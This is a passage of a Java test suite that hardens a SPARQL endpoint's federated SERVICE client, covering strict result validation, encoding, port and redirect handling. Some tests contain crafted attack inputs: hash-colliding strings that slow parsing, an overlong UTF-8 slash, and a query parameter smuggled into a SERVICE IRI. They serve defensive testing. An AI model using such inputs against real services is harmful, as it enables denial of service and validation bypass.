            var r = getCsv(fed.url(), "SELECT * WHERE { SERVICE <http://127.0.0.1:" + remote.getAddress().getPort() + "/far> { ?s ?p ?o } }");
            assertEquals(502, r.statusCode(), r.body());
            assertTrue(r.body().contains("port is not a port"), r.body());   // caught by the explicit-port check first
        } finally {
            remote.stop(0);
        }
    }

    // ---- co-review round 4 of #129 ----------------------------------------------------------------

    static String row(String term) {
        return "{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[{\"x\":" + term + "}]}}";
    }

    /** A literal's language and datatype must make a term: RDF4J took the rest and changed what it meant. */
    @Test
    void literalMetadataMustMakeATerm() {
        String json = "application/sparql-results+json";
        String lang = "http://www.w3.org/1999/02/22-rdf-syntax-ns#langString";
        for (String bad : List.of(
                "{\"type\":\"literal\",\"value\":\"a\",\"datatype\":\"" + lang + "\"}",
                "{\"type\":\"literal\",\"value\":\"a\",\"xml:lang\":\"en\",\"datatype\":\"http://www.w3.org/2001/XMLSchema#integer\"}",
                "{\"type\":\"uri\",\"value\":\"urn:a\",\"xml:lang\":\"en\"}",
                "{\"type\":\"bnode\",\"value\":\"b\",\"datatype\":\"http://www.w3.org/2001/XMLSchema#string\"}",
                "{\"type\":\"typed-literal\",\"value\":\"a\"}",
                "{\"type\":\"literal\",\"value\":\"a\",\"xml:lang\":\"not a tag\"}")) {
            assertTrue(TimedServiceClient.invalidResult(json, row(bad).getBytes(StandardCharsets.UTF_8), null) != null, bad);
        }
        for (String good : List.of(
                "{\"type\":\"literal\",\"value\":\"a\",\"xml:lang\":\"en-GB\"}",
                "{\"type\":\"literal\",\"value\":\"a\",\"xml:lang\":\"en\",\"datatype\":\"" + lang + "\"}",
                "{\"type\":\"literal\",\"value\":\"7\",\"datatype\":\"http://www.w3.org/2001/XMLSchema#integer\"}",
                "{\"type\":\"typed-literal\",\"value\":\"7\",\"datatype\":\"http://www.w3.org/2001/XMLSchema#integer\"}")) {
            assertEquals(null, TimedServiceClient.invalidResult(json, row(good).getBytes(StandardCharsets.UTF_8), null), good);
        }
    }

    /**
     * Results before head: RDF4J held the bindings in a set until the head came, so two identical
     * solutions became one. The answer reaches it head first, the bindings untouched.
     */
    @Test
    void identicalSolutionsSurviveResultsBeforeHead() throws Exception {
        String reversed = "{\"results\":{\"bindings\":[{\"x\":{\"type\":\"literal\",\"value\":\"a\"}},"
                + "{\"x\":{\"type\":\"literal\",\"value\":\"a\"}},{\"x\":{\"type\":\"literal\",\"value\":\"b\"}}]},"
                + "\"head\":{\"vars\":[\"x\"]}}";
        String normalised = new String(TimedServiceClient.headFirst(reversed.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
        assertTrue(normalised.startsWith("{\"head\":"), normalised);
        byte[] already = row("{\"type\":\"literal\",\"value\":\"a\"}").getBytes(StandardCharsets.UTF_8);
        assertTrue(already == TimedServiceClient.headFirst(already), "rewritten though the head was first");
        var remote = serve(java.util.Map.of("/rev", respond(200, "application/sparql-results+json", reversed, 0)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            var r = getCsv(fed.url(), "SELECT ?x WHERE { SERVICE <http://127.0.0.1:" + remote.getAddress().getPort() + "/rev> { ?s ?p ?x } }");
            assertEquals(200, r.statusCode(), r.body());
            assertEquals(List.of("x", "a", "a", "b"), r.body().lines().toList());
        } finally {
            remote.stop(0);
        }
    }

    // ---- co-review round 5 of #129 ----------------------------------------------------------------

    /**
     * A language tag of 10,000 subtags is checked, not a stack overflow: the regex recursed per
     * subtag, and the overflow reached the caller as "nests too deeply". The tag is well formed,
     * so the answer is taken.
     */
    @Test
    void aLongLanguageTagIsCheckedWithoutAStackOverflow() {
        String tag = "x" + "-a".repeat(10_000);
        String r = row("{\"type\":\"literal\",\"value\":\"v\",\"xml:lang\":\"" + tag + "\"}");
        assertEquals(null, TimedServiceClient.invalidResult("application/sparql-results+json", r.getBytes(StandardCharsets.UTF_8), null));
        assertFalse(TimedServiceClient.languageTag(tag + "-toolongsub"));
        assertTrue(TimedServiceClient.languageTag("en-GB") && TimedServiceClient.languageTag("zh-Hant-TW"));
        assertFalse(TimedServiceClient.languageTag("1en") || TimedServiceClient.languageTag("en--GB")
                || TimedServiceClient.languageTag("abcdefghi") || TimedServiceClient.languageTag("") || TimedServiceClient.languageTag("en-"));
        assertTrue(TimedServiceClient.languageTag("de-1996"));
    }

    /**
     * RDF4J parses the answer head first: reading the bindings first, it held them in a hash set,
     * and 16,384 distinct literals with one hash code took seconds — a parse no deadline can abort.
     */
    @Test
    void anAnswerIsParsedHeadFirstSoCollidingHashesStayCheap() {
        List<String> labels = new java.util.ArrayList<>(List.of(""));
        for (int i = 0; i < 14; i++) {   // "Aa" and "BB" share a hash code, and so do all their concatenations
            List<String> next = new java.util.ArrayList<>();
            for (String l : labels) {
                next.add(l + "Aa");
                next.add(l + "BB");
            }
            labels = next;
        }
        StringBuilder bindings = new StringBuilder();
        for (String l : labels) {
            bindings.append(bindings.length() == 0 ? "" : ",").append("{\"x\":{\"type\":\"literal\",\"value\":\"").append(l).append("\"}}");
        }
        byte[] reversed = ("{\"results\":{\"bindings\":[" + bindings + "]},\"head\":{\"vars\":[\"x\"]}}").getBytes(StandardCharsets.UTF_8);
        long t0 = System.nanoTime();
        var checked = TimedServiceClient.check("application/sparql-results+json", reversed, true);
        double took = (System.nanoTime() - t0) / 1e9;
        assertEquals(null, checked.why());
        assertTrue(new String(checked.body(), 0, 8, StandardCharsets.UTF_8).equals("{\"head\":"), "not rewritten head first");
        assertTrue(took < 1.5, "checking took " + took + " s");
    }

    // ---- co-review round 6 of #129 ----------------------------------------------------------------

    /** A member given twice is refused: a second head after the results slipped past the head-first rewrite. */
    @Test
    void aMemberGivenTwiceIsRefused() {
        String json = "application/sparql-results+json";
        for (String bad : List.of(
                "{\"head\":{},\"results\":{\"bindings\":[]},\"head\":{\"vars\":[\"x\"]}}",
                "{\"head\":{\"vars\":[\"x\"],\"vars\":[\"y\"]},\"results\":{\"bindings\":[]}}",
                "{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[],\"bindings\":[]}}")) {
            assertTrue(TimedServiceClient.invalidResult(json, bad.getBytes(StandardCharsets.UTF_8), null) != null, bad);
        }
    }

    /** IRIs are checked strictly: RDF4J took "http://example.org/a b", and an update stored it. */
    @Test
    void iriValuesMustBeAbsoluteIris() {
        String json = "application/sparql-results+json";
        for (String bad : List.of("{\"type\":\"uri\",\"value\":\"http://example.org/a b\"}", "{\"type\":\"uri\",\"value\":\"relative/path\"}",
                "{\"type\":\"literal\",\"value\":\"1\",\"datatype\":\"not an iri\"}")) {
            assertTrue(TimedServiceClient.invalidResult(json, row(bad).getBytes(StandardCharsets.UTF_8), null) != null, bad);
        }
        assertEquals(null, TimedServiceClient.invalidResult(json,
                row("{\"type\":\"uri\",\"value\":\"http://example.org/ä?q=1#f\"}").getBytes(StandardCharsets.UTF_8), null));
    }

    // ---- co-review round 7 of #129 ----------------------------------------------------------------

    /**
     * SERVICE inside an ORDER BY key is refused: RDF4J sorts in parallel, and the sort's pool
     * threads have no budget — 9,000 rows made 19 requests under a limit of 1. Ordering by a
     * variable a SERVICE bound is fine.
     */
    @Test
    void serviceInsideAnOrderingIsRefused() throws Exception {
        var hits = new java.util.concurrent.atomic.AtomicInteger();
        var remote = serve(java.util.Map.of("/rows", rowEcho(0, hits)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            String service = "http://127.0.0.1:" + remote.getAddress().getPort() + "/rows";
            var refused = getCsv(fed.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> ?d } ORDER BY (EXISTS { SERVICE <" + service
                    + "> { <urn:s> <urn:p> <urn:o> } })");
            assertEquals(400, refused.statusCode(), refused.body());
            assertEquals(0, hits.get());
            var fine = getCsv(fed.url(), "SELECT ?x WHERE { SERVICE <" + service + "> { ?s ?p ?x } } ORDER BY ?x");
            assertEquals(200, fine.statusCode(), fine.body());
        } finally {
            remote.stop(0);
        }
        assertFalse(SparqlProtocolServlet.serviceInOrdering(org.eclipse.rdf4j.query.parser.QueryParserUtil.parseQuery(org.eclipse.rdf4j.query.QueryLanguage.SPARQL,
                "SELECT * WHERE { SERVICE <http://r/> { ?s ?p ?o } } ORDER BY ?o", null).getTupleExpr()));
    }

    /** A SERVICE IRI carrying its own query parameter is refused: RDF4J's query became the second one, and the IRI's was checked. */
    @Test
    void aServiceIriWithItsOwnQueryParameterIsRefused() throws Exception {
        var remote = serve(java.util.Map.of("/bool", respond(200, "application/sparql-results+json", "{\"head\":{},\"boolean\":false}", 0)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            String service = "http://127.0.0.1:" + remote.getAddress().getPort() + "/bool?query=ASK%7B%7D";
            for (String silent : List.of("", "SILENT ")) {
                var r = getCsv(fed.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> ?d SERVICE " + silent + "<" + service + "> { ?y <urn:ex:q> ?x } }");
                assertEquals(400, r.statusCode(), silent + r.body());
                assertTrue(r.body().contains("'query' parameter of its own"), r.body());
            }
        } finally {
            remote.stop(0);
        }
    }

    /** IRIs by java.net.URI: ParsedIRI refused http://127.0.0.1?x and took http://[not-an-ip]/a. */
    @Test
    void iriCheckingFollowsTheGrammar() {
        assertTrue(TimedServiceClient.absoluteIri("http://127.0.0.1?x"));
        assertTrue(TimedServiceClient.absoluteIri("http://[::1]/a"));
        assertTrue(TimedServiceClient.absoluteIri("urn:ex:a"));
        assertFalse(TimedServiceClient.absoluteIri("http://[not-an-ip]/a"));
        assertFalse(TimedServiceClient.absoluteIri("http://example.org/a b"));
        assertFalse(TimedServiceClient.absoluteIri("relative/path"));
    }

    // ---- co-review round 8 of #129 ----------------------------------------------------------------

    /** Members RDF4J reads are checked too: a malformed head.link ended its parse early, and ordered held bindings it read. */
    @Test
    void membersRdf4jReadsAreChecked() {
        String json = "application/sparql-results+json";
        for (String bad : List.of(
                "{\"head\":{\"link\":[{\"x\":[]}],\"vars\":[\"x\"]},\"results\":{\"bindings\":[]}}",
                "{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[],\"ordered\":{\"bindings\":[{\"x\":{\"type\":\"uri\",\"value\":\"http://example.org/a b\"}}]}}}",
                "{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[],\"distinct\":\"yes\"}}")) {
            assertTrue(TimedServiceClient.invalidResult(json, bad.getBytes(StandardCharsets.UTF_8), null) != null, bad);
        }
        assertEquals(null, TimedServiceClient.invalidResult(json, ("{\"head\":{\"link\":[\"http://example.org/about\"],\"vars\":[\"x\"]},"
                + "\"results\":{\"ordered\":true,\"distinct\":false,\"bindings\":[]}}").getBytes(StandardCharsets.UTF_8), null));
    }

    /** RFC 3987 itself: java.net.URI refused U+00A0 in a path and took urn:a[b] and private-use characters outside the query. */
    @Test
    void iriCheckingFollowsRfc3987() {
        assertTrue(TimedServiceClient.absoluteIri("http://example.org/a b"));
        assertTrue(TimedServiceClient.absoluteIri("http://example.org/?q="));
        assertTrue(TimedServiceClient.absoluteIri("http://[v1.fe80::a]/x"));
        assertTrue(TimedServiceClient.absoluteIri("http://user:pw@example.org:8080/p?q#f"));
        assertTrue(TimedServiceClient.absoluteIri("mailto:someone@example.org"));
        assertFalse(TimedServiceClient.absoluteIri("urn:a[b]"));
        assertFalse(TimedServiceClient.absoluteIri("http://example.org/"));
        assertFalse(TimedServiceClient.absoluteIri("http://example.org:80a/"));
        assertFalse(TimedServiceClient.absoluteIri("http://[::1/x"));
        assertFalse(TimedServiceClient.absoluteIri("1http://example.org/"));
        assertFalse(TimedServiceClient.absoluteIri("http://example.org/%zz"));
        assertFalse(TimedServiceClient.absoluteIri("http://example.org/a￾b"));
    }

    // ---- co-review round 9 of #129 ----------------------------------------------------------------

    /** IPv6 by its grammar, ASCII hex only, and plane 14 from U+E1000. */
    @Test
    void iriDetailsFollowTheGrammar() {
        for (String ok : List.of("http://[::ffff:192.0.2.1]/r", "http://[::1]/", "http://[2001:db8::]/", "http://[1:2:3:4:5:6:7:8]/",
                "http://[::]/", "http://[1:2:3:4:5:6:192.0.2.1]/", "urn:x\udb44\udc00")) {   // U+E1000
            assertTrue(TimedServiceClient.absoluteIri(ok), ok);
        }
        for (String bad : List.of("http://[::192.000.2.1]/r", "http://[1:2:3:4:5:6:7:8:9]/", "http://[1::2::3]/", "http://[12345::]/",
                "http://[1:2:3:4:5:6:7]/", "http://[::256.0.0.1]/", "http://example.org/%４１", "http://[v１.a]/",
                "urn:x󠀁")) {   // U+E0001
            assertFalse(TimedServiceClient.absoluteIri(bad), bad);
        }
        String json = "application/sparql-results+json";
        assertTrue(TimedServiceClient.invalidResult(json, row("{\"type\":\"uri\",\"value\":\"urn:x󠀁\"}")
                .getBytes(StandardCharsets.UTF_8), null) != null);
        assertTrue(TimedServiceClient.invalidResult(json, row("{\"type\":\"literal\",\"value\":\"1\",\"datatype\":\"urn:x󠀁\"}")
                .getBytes(StandardCharsets.UTF_8), null) != null);
    }

    // ---- co-review round 10 of #129 ---------------------------------------------------------------

    /** Strict UTF-8, whatever the member order: the overlong C0 AF passed, as two U+FFFD or as "/". */
    @Test
    void malformedUtf8IsRefusedInEitherOrder() throws Exception {
        String json = "application/sparql-results+json";
        for (boolean headFirst : new boolean[] {true, false}) {
            var out = new java.io.ByteArrayOutputStream();
            String head = "\"head\":{\"vars\":[\"x\"]}";
            out.write(("{" + (headFirst ? head + "," : "") + "\"results\":{\"bindings\":[{\"x\":{\"type\":\"literal\",\"value\":\"a")
                    .getBytes(StandardCharsets.US_ASCII));
            out.write(new byte[] {(byte) 0xC0, (byte) 0xAF});
            out.write(("\"}}]}" + (headFirst ? "" : "," + head) + "}").getBytes(StandardCharsets.US_ASCII));
            assertTrue(TimedServiceClient.invalidResult(json, out.toByteArray(), null) != null, "head first: " + headFirst);
        }
    }

    /** An escaped lone surrogate is refused: RDF4J held a literal no UTF-8 can carry. */
    @Test
    void anUnpairedSurrogateIsRefused() {
        String json = "application/sparql-results+json";
        assertTrue(TimedServiceClient.invalidResult(json, row("{\"type\":\"literal\",\"value\":\"\\ud800\"}")
                .getBytes(StandardCharsets.UTF_8), null) != null);
        assertTrue(TimedServiceClient.invalidResult(json, row("{\"type\":\"literal\",\"value\":\"a\\udc00b\"}")
                .getBytes(StandardCharsets.UTF_8), null) != null);
        assertEquals(null, TimedServiceClient.invalidResult(json, row("{\"type\":\"literal\",\"value\":\"\\ud83d\\ude97\"}")
                .getBytes(StandardCharsets.UTF_8), null));   // a whole pair: a car
        assertTrue(TimedServiceClient.paired("ok \ud83d\ude97") && !TimedServiceClient.paired("\ud83d") && !TimedServiceClient.paired("\ude97x"));
    }

    /** BCP 47 by its grammar (RFC 5646 §2.1): characters and lengths alone took "a", "en-a" and "en-US-US". */
    @Test
    void languageTagsFollowBcp47() {
        for (String ok : List.of("en", "en-GB", "zh-Hant-TW", "de-1996", "sl-rozaj-biske", "en-a-bbb-x-a", "x-a", "i-klingon",
                "zh-yue-HK", "es-419", "en-US-x-twain", "abcd", "abcdefgh")) {
            assertTrue(TimedServiceClient.languageTag(ok), ok);
        }
        for (String bad : List.of("a", "x", "en-a", "en-US-US", "en-x", "1en", "en--GB", "abcdefghi", "en-", "en-GB-a-x-b",
                "en-abc-def-ghi-jkl", "e1")) {
            assertFalse(TimedServiceClient.languageTag(bad), bad);
        }
    }

    // ---- co-review round 11 of #129 ---------------------------------------------------------------

    /** JSON may be UTF-16 or UTF-32 (RFC 4627 §3): a valid UTF-16LE answer was a 502. Each is decoded strictly. */
    @Test
    void jsonInUtf16And32IsDecodedStrictly() {
        String json = "application/sparql-results+json";
        String answer = row("{\"type\":\"literal\",\"value\":\"café\"}");
        for (String cs : List.of("UTF-16LE", "UTF-16BE", "UTF-32LE", "UTF-32BE", "UTF-8")) {
            var checked = TimedServiceClient.check(json, answer.getBytes(java.nio.charset.Charset.forName(cs)), true);
            assertEquals(null, checked.why(), cs);
            assertEquals(answer, new String(checked.body(), StandardCharsets.UTF_8), cs + " carried on as UTF-8");
        }
        // a malformed unit inside a literal, so the JSON stays well formed: only strict decoding
        // refuses it (the test once broke the closing brace, and passed with lenient decoding)
        String marked = row("{\"type\":\"literal\",\"value\":\"aZb\"}");
        Object[][] cases = {
                {"UTF-16LE", new byte[] {0x00, (byte) 0xDC}},             // a lone low surrogate
                {"UTF-16BE", new byte[] {(byte) 0xDC, 0x00}},
                {"UTF-32BE", new byte[] {0x00, 0x00, (byte) 0xD8, 0x00}}, // U+D800, a surrogate code point
                {"UTF-32LE", new byte[] {0x00, (byte) 0xD8, 0x00, 0x00}},
        };
        for (Object[] c : cases) {
            String cs = (String) c[0];
            byte[] unit = (byte[]) c[1];
            byte[] bytes = marked.getBytes(java.nio.charset.Charset.forName(cs));
            byte[] z = "Z".getBytes(java.nio.charset.Charset.forName(cs));
            int at = indexOf(bytes, z);
            System.arraycopy(unit, 0, bytes, at, unit.length);
            assertTrue(TimedServiceClient.check(json, bytes, true).why() != null, "malformed " + cs);
        }
    }

    static int indexOf(byte[] haystack, byte[] needle) {
        outer:
        for (int i = 0; i + needle.length <= haystack.length; i++) {
            for (int j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    continue outer;
                }
            }
            return i;
        }
        throw new AssertionError("not found");
    }

    /** An explicit port must be a port: Apache read ":-2" as none and went to port 80. */
    @Test
    void anExplicitPortMustBeAPort() throws Exception {
        assertTrue(TimedServiceClient.explicitPortValid(URI.create("http://h:8080/")));
        assertTrue(TimedServiceClient.explicitPortValid(URI.create("http://h/")));
        assertTrue(TimedServiceClient.explicitPortValid(URI.create("http://h:/")));
        assertTrue(TimedServiceClient.explicitPortValid(URI.create("http://[::1]:443/")));
        assertFalse(TimedServiceClient.explicitPortValid(URI.create("http://h:-2/")));
        assertFalse(TimedServiceClient.explicitPortValid(URI.create("http://h:0/")));
        assertFalse(TimedServiceClient.explicitPortValid(URI.create("http://h:65536/")));
        assertFalse(TimedServiceClient.explicitPortValid(URI.create("http://h:123456/")));
        assertTrue(TimedServiceClient.explicitPortValid(URI.create("https://h:000443/")));   // leading zeros are allowed
        assertFalse(TimedServiceClient.explicitPortValid(URI.create("http://h:0000/")));
        assertFalse(TimedServiceClient.explicitPortValid(URI.create("http://h:99999999999999999999/")));
        var remote = serve(java.util.Map.of("/neg", respond(302, "text/plain", "", 0, "Location", "http://127.0.0.1:-2/a")));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            var r = getCsv(fed.url(), "SELECT * WHERE { SERVICE <http://127.0.0.1:" + remote.getAddress().getPort() + "/neg> { ?s ?p ?o } }");
            assertEquals(502, r.statusCode(), r.body());
            assertTrue(r.body().contains("port is not a port"), r.body());
        } finally {
            remote.stop(0);
        }
    }

    /** What a recording remote saw of one request. */
    record Seen(String method, String rawQuery, String contentType, String body) { }

    /**
     * Records each request, then answers as {@link #rowEcho} does: one row binding {@code ?x} per
     * row of a bound join's {@code VALUES} block, or one row when there is none.
     */
    static com.sun.net.httpserver.HttpHandler recording(java.util.Queue<Seen> seen) {
        return ex -> {
            String body = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
            seen.add(new Seen(ex.getRequestMethod(), ex.getRequestURI().getRawQuery(),
                    ex.getRequestHeaders().getFirst("Content-Type"), body));
            var m = java.util.regex.Pattern.compile("\\(\"(\\d+)\"")
                    .matcher(java.net.URLDecoder.decode(body, StandardCharsets.UTF_8));
            StringBuilder rows = new StringBuilder();
            while (m.find()) {
                rows.append(rows.length() == 0 ? "" : ",").append("{\"x\":{\"type\":\"literal\",\"value\":\"r\"},"
                        + "\"__rowIdx\":{\"type\":\"literal\",\"value\":\"").append(m.group(1)).append("\"}}");
            }
            if (rows.length() == 0) {
                rows.append("{\"x\":{\"type\":\"literal\",\"value\":\"r\"}}");
            }
            respond(200, "application/sparql-results+json",
                    "{\"head\":{\"vars\":[\"x\",\"__rowIdx\"]},\"results\":{\"bindings\":[" + rows + "]}}", 0)
                    .handle(ex);
        };
    }

    /**
     * A SERVICE query, and the bindings it joins on, travel in a form body, not the URL: RDF4J
     * sent them as a GET while the URL stayed under about 4 KB, where the remote's and every
     * proxy's access log kept them. The SERVICE IRI's own parameters stay in its URL.
     */
    @Test
    void serviceQueriesTravelInTheBodyNotTheUrl() throws Exception {
        var seen = new java.util.concurrent.ConcurrentLinkedQueue<Seen>();
        var remote = serve(java.util.Map.of("/s", recording(seen)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            for (String suffix : List.of("", "#fragment")) {
                var r = getCsv(fed.url(), "SELECT * WHERE { VALUES ?v { <urn:ex:secret-k0> <urn:ex:secret-k1> } SERVICE <"
                        + base(remote) + "/s?key=a%26b" + suffix + "> { ?v <urn:ex:q> ?x } }");
                assertEquals(200, r.statusCode(), r.body());
                assertEquals(3, r.body().strip().split("\r?\n").length, "two rows joined: " + r.body());
            }
            assertFalse(seen.isEmpty());
            for (Seen s : seen) {
                assertEquals("POST", s.method(), s.toString());
                assertTrue(s.contentType().startsWith("application/x-www-form-urlencoded"), s.toString());
                var url = org.apache.http.client.utils.URLEncodedUtils.parse(s.rawQuery(), StandardCharsets.UTF_8);
                assertEquals(1, url.size(), "only the IRI's own parameter stays in the URL: " + s);
                assertEquals("key", url.get(0).getName());
                assertEquals("a&b", url.get(0).getValue());
                var form = org.apache.http.client.utils.URLEncodedUtils.parse(s.body(), StandardCharsets.UTF_8);
                assertEquals("query", form.get(0).getName(), s.toString());
                assertTrue(form.get(0).getValue().contains("urn:ex:secret-k0"), "the bindings go in the body: " + s);
            }
        } finally {
            remote.stop(0);
        }
    }

    /** RDF4J's parameters move to the body from {@code query} on; anything that is not such a GET is left alone. */
    @Test
    void onlyAGetCarryingAQueryIsTurnedIntoAPost() throws Exception {
        var get = new org.apache.http.client.methods.HttpGet(
                "http://h:8/s?key=a%26b&query=SELECT%20*%20%7B%7D&default-graph-uri=urn%3Ag");
        get.addHeader("Accept", "application/sparql-results+json");
        var post = TimedServiceClient.asPost(get);
        assertEquals("POST", post.getRequestLine().getMethod());
        assertEquals("http://h:8/s?key=a%26b", post.getRequestLine().getUri());
        assertEquals("application/sparql-results+json", post.getFirstHeader("Accept").getValue());
        var entity = ((org.apache.http.HttpEntityEnclosingRequest) post).getEntity();
        assertEquals("query=SELECT%20*%20%7B%7D&default-graph-uri=urn%3Ag", org.apache.http.util.EntityUtils.toString(entity));
        assertTrue(entity.getContentType().getValue().startsWith("application/x-www-form-urlencoded"));
        assertTrue(entity.isRepeatable(), "a redirect sends it again");

        var bare = TimedServiceClient.asPost(new org.apache.http.client.methods.HttpGet("http://h/s?query=ASK%7B%7D"));
        assertEquals("http://h/s", bare.getRequestLine().getUri());
        // RDF4J keeps a fragment at the end; it is dropped, and the query moves all the same
        var fragment = TimedServiceClient.asPost(new org.apache.http.client.methods.HttpGet("http://h/s?key=1&query=ASK%7B%7D#f"));
        assertEquals("POST", fragment.getRequestLine().getMethod());
        assertEquals("http://h/s?key=1", fragment.getRequestLine().getUri());
        assertEquals("query=ASK%7B%7D", org.apache.http.util.EntityUtils.toString(
                ((org.apache.http.HttpEntityEnclosingRequest) fragment).getEntity()));
        var noQuery = new org.apache.http.client.methods.HttpGet("http://h/s?key=1");
        assertSame(noQuery, TimedServiceClient.asPost(noQuery));
        var already = new org.apache.http.client.methods.HttpPost("http://h/s");
        assertSame(already, TimedServiceClient.asPost(already));
    }

    /**
     * A deadline that fires while the POST is being built aborts RDF4J's GET, which is never sent;
     * the POST must not then go out unbounded. Paused in that window until the GET is aborted, the
     * request ends as a timeout and the remote is not asked again. On a pooled connection: a new
     * one needs a name lookup, whose own deadline would stop the POST and hide the window.
     */
    @Test
    void aDeadlineWhileThePostIsBuiltStopsIt() throws Exception {
        var hits = new java.util.concurrent.atomic.AtomicInteger();
        var remote = serve(java.util.Map.of("/s", rowEcho(0, hits)));
        TimedServiceClient client = new TimedServiceClient(200);
        // a first request leaves a pooled connection: the next needs no name lookup, whose own
        // deadline would otherwise stop it and hide the window
        try (var warm = client.execute(new org.apache.http.client.methods.HttpGet(base(remote) + "/s?query=" + enc("SELECT * {}")))) {
            assertEquals(200, warm.getStatusLine().getStatusCode());
        }
        assertEquals(1, hits.get());
        TimedServiceClient.beforePublish = original -> {
            long until = System.nanoTime() + 5_000_000_000L;
            while (!((org.apache.http.client.methods.HttpRequestBase) original).isAborted() && System.nanoTime() < until) {
                Thread.onSpinWait();
            }
        };
        try {
            var get = new org.apache.http.client.methods.HttpGet(base(remote) + "/s?query=" + enc("ASK {}"));
            assertThrows(java.net.SocketTimeoutException.class, () -> client.execute(get).close());
            assertTrue(get.isAborted(), "the deadline fired in the window");
            assertEquals(1, hits.get(), "the POST went out after the deadline");
        } finally {
            TimedServiceClient.beforePublish = null;
            client.release();
            remote.stop(0);
        }
    }

    /**
     * A POST is redirected with its body: 301, 302, 307 and 308 send it again to the new place,
     * so the query arrives; a 303 is a GET of what it names, without the body. Before, only a GET
     * was followed, and a POST's redirect was a 502.
     */
    @Test
    void aRedirectedServicePostKeepsItsQuery() throws Exception {
        var seen = new java.util.concurrent.ConcurrentLinkedQueue<Seen>();
        var other = new java.util.concurrent.ConcurrentLinkedQueue<Seen>();
        var remote = serve(java.util.Map.of(
                "/s", recording(seen),
                "/answer", recording(other),
                "/moved", respond(301, "text/plain", "", 0, "Location", "/s"),
                "/found", respond(302, "text/plain", "", 0, "Location", "/s"),
                "/temporary", respond(307, "text/plain", "", 0, "Location", "/s"),
                "/permanent", respond(308, "text/plain", "", 0, "Location", "/s"),
                "/see-other", respond(303, "text/plain", "", 0, "Location", "/answer")));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            for (String path : java.util.List.of("/moved", "/found", "/temporary", "/permanent")) {
                seen.clear();
                var r = getCsv(fed.url(), "SELECT * WHERE { SERVICE <" + base(remote) + path + "> { ?s <urn:ex:q> ?x } }");
                assertEquals(200, r.statusCode(), path + ": " + r.body());
                assertEquals(1, seen.size(), path);
                Seen s = seen.peek();
                assertEquals("POST", s.method(), path);
                assertTrue(s.body().startsWith("query="), path + ": " + s);
            }
            var r = getCsv(fed.url(), "SELECT * WHERE { SERVICE <" + base(remote) + "/see-other> { ?s <urn:ex:q> ?x } }");
            assertEquals(200, r.statusCode(), r.body());
            assertEquals(1, other.size());
            assertEquals("GET", other.peek().method());
            assertEquals("", other.peek().body(), "a 303 is followed without the body");
        } finally {
            remote.stop(0);
        }
    }

    /** A GET of the endpoint itself, no query string. */
    static HttpResponse<String> bare(String url, String accept, String... headers) throws Exception {
        HttpRequest.Builder b = HttpRequest.newBuilder(URI.create(url));
        if (accept != null) {
            b.header("Accept", accept);
        }
        for (int i = 0; i + 1 < headers.length; i += 2) {
            b.header(headers[i], headers[i + 1]);
        }
        return HTTP.send(b.build(), HttpResponse.BodyHandlers.ofString());
    }

    static org.eclipse.rdf4j.model.Model description(HttpResponse<String> r, org.eclipse.rdf4j.rio.RDFFormat f)
            throws Exception {
        return org.eclipse.rdf4j.rio.Rio.parse(new java.io.StringReader(r.body()), "", f);
    }

    static IRI sd(String local) {
        return VF.createIRI(SparqlProtocolServlet.SD, local);
    }

    /**
     * A GET of the endpoint with no query string answers its SPARQL 1.1 Service Description: what
     * it accepts and answers in, and nothing about the data. It was a 400.
     */
    @Test
    void theBareEndpointDescribesItsService() throws Exception {
        var r = bare(shared.url(), null);
        assertEquals(200, r.statusCode(), r.body());
        assertTrue(r.headers().firstValue("Content-Type").orElse("").startsWith("text/turtle"), r.headers().toString());
        assertTrue(r.headers().allValues("Vary").stream().anyMatch(v -> v.contains("Accept")));
        var m = description(r, org.eclipse.rdf4j.rio.RDFFormat.TURTLE);
        var services = m.filter(null, org.eclipse.rdf4j.model.vocabulary.RDF.TYPE, sd("Service")).subjects();
        assertEquals(1, services.size(), r.body());
        var service = services.iterator().next();
        assertTrue(m.contains(service, sd("endpoint"), VF.createIRI(shared.url())), r.body());
        assertTrue(m.contains(service, sd("supportedLanguage"), sd("SPARQL11Query")));
        assertFalse(m.contains(service, sd("supportedLanguage"), sd("SPARQL11Update")), "updates are off by default");
        assertFalse(m.contains(service, sd("feature"), sd("UnionDefaultGraph")), "RDF4J's default graph is not only the named graphs");
        assertFalse(m.contains(service, sd("feature"), sd("BasicFederatedQuery")), "federation is off by default");
        for (String f : List.of("SPARQL_Results_JSON", "SPARQL_Results_XML", "SPARQL_Results_CSV", "SPARQL_Results_TSV",
                "Turtle", "N-Triples", "RDF_XML", "JSON-LD")) {
            assertTrue(m.contains(service, sd("resultFormat"), VF.createIRI("http://www.w3.org/ns/formats/" + f)), f);
        }
        assertFalse(m.contains(null, sd("availableGraphs"), null), "no metadata graph is served here");
        assertFalse(r.body().contains("EV-7Q2") || r.body().contains("urn:ex:g1"), "nothing of the data: " + r.body());

        var jsonLd = bare(shared.url(), "application/ld+json");
        assertEquals(200, jsonLd.statusCode(), jsonLd.body());
        assertEquals(1, description(jsonLd, org.eclipse.rdf4j.rio.RDFFormat.JSONLD)
                .filter(null, org.eclipse.rdf4j.model.vocabulary.RDF.TYPE, sd("Service")).size());
        assertEquals(406, bare(shared.url(), "application/sparql-results+json").statusCode(), "not an RDF format");
        var head = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url())).method("HEAD", HttpRequest.BodyPublishers.noBody())
                .build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(200, head.statusCode());
        assertEquals("", head.body());
        // parameters but no query are still a 400: the description is for the bare endpoint only
